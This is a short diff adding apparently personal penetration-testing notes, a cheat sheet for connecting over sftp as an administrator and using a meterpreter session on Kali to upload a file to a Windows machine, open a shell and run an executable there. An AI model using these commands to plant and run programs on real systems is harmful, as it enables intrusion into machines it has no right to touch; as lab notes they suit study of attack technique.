@@ -1,0 +1,10 @@
+sftp administrator@10.10.207.125
+sftp>dir
+------------------------------------------------------------------
+
+from kali to Windows
+meterpreter > upload /root/desktop/anyfile c:\\anylocation
+------------------------------------------------------------------
+from kali to windows - EXECUTE
+meterpreter > shell
+c:\users\downloads > file.exe
